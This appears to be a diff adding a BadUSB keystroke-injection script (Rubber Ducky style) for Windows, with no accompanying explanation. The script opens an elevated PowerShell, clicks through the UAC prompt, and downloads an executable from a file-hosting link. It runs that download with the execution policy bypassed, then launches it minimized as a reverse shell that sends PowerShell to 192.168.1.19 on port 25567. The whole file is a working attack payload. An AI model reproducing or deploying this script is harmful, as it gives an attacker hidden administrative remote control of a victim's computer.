@@ -1,0 +1,22 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+SHIFT TAB
+ENTER
+DELAY 500
+STRING cd \; mkdir \win; cd \win; echo (powershell Invoke-WebRequest -Outfile a.exe 'https://1fichier.com/?1emsgmlt6d') > b.ps1; powershell -ExecutionPolicy ByPass -File b.ps1
+ENTER
+DELAY 1250
+STRING cmd.exe
+DELAY 50
+ENTER
+DELAY 200
+STRING START /MIN a.exe 192.168.1.19 25567 -e powershell.exe -d & exit
+DELAY 50
+ENTER
+DELAY 100
+STRING Exit
+ENTER
